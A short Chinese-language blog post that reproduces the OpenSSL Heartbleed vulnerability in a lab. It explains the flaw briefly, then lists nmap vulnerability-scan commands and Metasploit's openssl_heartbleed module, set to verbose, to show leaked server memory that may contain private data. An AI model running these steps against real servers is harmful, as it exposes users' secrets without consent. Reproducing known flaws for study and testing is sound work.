---
title: openssl心脏滴血漏洞
tags:
  - openssl
  - 漏洞复现
abbrlink: 34537
date: 2022-05-25 13:13:51
---

## openssl心脏滴血漏洞

心脏出血漏洞”是指openssl这个开源软件中的一个漏洞，因为该软件使用到一个叫做heartbeat(中文名称为心跳)的扩展，恰恰是这个扩展出现了问题，所以才将这个漏洞形象的称为“心脏出血”；

## 影响范围

OpenSSL 1.0.1版本

## 漏洞复现

nmap -O xxxxx 查看开放端口

nmap xxxx --script=vuln

![](https://raw.githubusercontent.com/16778738/picture/master/img/20220525132155.png)

nmap -sV -p 8443 --script ssl-heartbleed.nse xxxxxx

### msf

~~~
search heartbleed

use uxiliary/scanner/ssl/openssl_heartbleed

~~~

~~~~
设置一下verbose，让verbose为true这样我们才可以看到泄露的64kb数据

set  verbose true
~~~~

![](https://raw.githubusercontent.com/16778738/picture/master/img/20220525132725.png)

可以看到一些泄露的数据，假如这是被攻击端正在输入一些私密的数据，我们就有可能获取到这些数据了。
